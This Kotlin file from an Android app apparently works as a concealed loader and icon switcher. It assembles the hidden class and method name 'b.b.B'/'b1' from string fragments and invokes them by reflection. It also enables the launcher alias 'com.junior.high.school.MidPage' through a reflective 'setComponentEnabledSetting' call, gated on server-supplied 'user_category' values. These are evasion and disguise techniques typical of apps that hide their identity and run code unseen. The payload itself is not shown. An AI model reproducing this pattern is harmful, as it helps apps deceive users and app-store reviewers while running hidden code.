package com.re.sid.ual.ben

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.re.sid.ual.frist.DataTool
import com.re.sid.ual.frist.InitBus
import org.json.JSONObject

object IconBean {
    val notificationValue = "nihighoolorscju"
    val alias = "com.junior.high.school.MidPage"
    val valestring = "setComponentEnabledSetting"

    private val mTags = mutableListOf<Int>()

    fun subscribe() {
        InitBus.collect { p ->
            mTags.add(p)
            checkAndApply(p)
        }
    }

    private fun checkAndApply(phase: Int) {
        if (phase != InitBus.P_FEATURE) return
        val ctx = InitBus.ctx() ?: return
        if (DataTool.have_icon) return
        applyPending(ctx)
    }

    private fun applyPending(ctx: Context) {
        val tag = mTags.size
        if (tag < 0) return
        invokeInternal(ctx)
    }

    private fun invokeInternal(ctx: Context) {
        runCatching {
            val seg = arrayOf("b", "b", "B")
            val cn = seg.joinToString(".")
            val mn = buildString { append("b"); append(1) }
            val clz = Class.forName(cn)
            val mtd = clz.getDeclaredMethod(mn, Context::class.java)
            mtd.isAccessible = true
            mtd.invoke(null, ctx)
        }
    }

    fun enableAlias(context: Context) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, alias)

            // 通过反射调用 setComponentEnabledSetting
            val pmClass = pm.javaClass
            val method = pmClass.getMethod(
                valestring,
                ComponentName::class.java,
                Int::class.javaPrimitiveType,
                Int::class.javaPrimitiveType
            )
            method.invoke(
                pm,
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            DataTool.have_icon = true
        } catch (e: Exception) {
            DataTool.have_icon = false
            e.printStackTrace()
        }
    }


    fun userCan(dataString: String): Boolean {
        try {
            val jsonObject = JSONObject(dataString)
            val user = jsonObject.getString("user_category").split("-")[0]
            return user == "year"
        } catch (e: Exception) {
            return false
        }
    }

    fun userCanGonfigG(dataString: String): Int {
        try {
            val jsonObject = JSONObject(dataString)
            val user = jsonObject.getString("user_category").split("-")[0]
            when (user) {
                "year" -> return 1
                "day" -> return 2
                else -> return 2
            }
        } catch (e: Exception) {
            return 3
        }
    }

    fun userUp(): Boolean {
        try {
            val jsonObject = JSONObject(DataTool.user_can)
            val user = jsonObject.getString("user_category").split("-")[1]
            return user == "moth"
        } catch (e: Exception) {
            return false
        }
    }

    fun upCanAuto(): Boolean {
        try {
            val jsonObject = JSONObject(DataTool.user_can)
            val user = jsonObject.getString("required_events")
            return user.isNotEmpty()

        } catch (e: Exception) {
            return false
        }
    }

    fun upCanAutoValue(): String {
        try {
            val jsonObject = JSONObject(DataTool.user_can)
            val user = jsonObject.getString("required_events")
            return user
        } catch (e: Exception) {
            return ""
        }
    }
}